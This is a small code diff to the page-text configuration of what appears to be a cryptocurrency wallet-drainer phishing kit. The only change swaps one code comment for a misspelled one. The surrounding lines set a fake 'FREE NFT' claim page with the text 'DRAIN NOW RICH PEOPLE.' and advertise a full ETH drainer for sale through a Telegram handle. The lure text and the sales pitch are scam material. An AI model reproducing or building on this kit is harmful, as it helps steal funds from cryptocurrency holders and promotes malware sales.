@@ -16,7 +16,7 @@ const indexPageInfo = {
 }
 
 const claimPageInfo = {
-    title: "FREE NFT", // <br> is a line break
+    title: "FREE NFT", // Name will appeair
     shortDescription: "DRAIN NOW RICH PEOPLE.",
     longDescription: "YOU CAN ALSO BUY FULL ETH DRAINER WITH SIGNATURE AT T.ME/TECONSELLIX. ENJOY DRAINING!",
 
